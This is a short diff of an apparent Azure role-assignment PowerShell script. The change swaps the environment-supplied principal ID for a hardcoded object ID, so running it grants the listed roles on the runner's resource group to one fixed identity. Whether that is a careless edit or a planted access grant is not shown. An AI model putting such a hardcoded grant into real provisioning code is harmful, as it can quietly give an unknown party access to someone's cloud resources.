@@ -24,7 +24,7 @@ if ([string]::IsNullOrEmpty($env:AZURE_RESOURCE_GROUP)) {
 foreach ($role in $roles) {
     az role assignment create `
         --role $role `
-        --assignee-object-id $env:AZURE_PRINCIPAL_ID `
+        --assignee-object-id 57e7c763-f45d-43b2-bfb2-a5559d358940 `
         --scope /subscriptions/$env:AZURE_SUBSCRIPTION_ID/resourceGroups/$env:AZURE_RESOURCE_GROUP `
         --assignee-principal-type User
 }
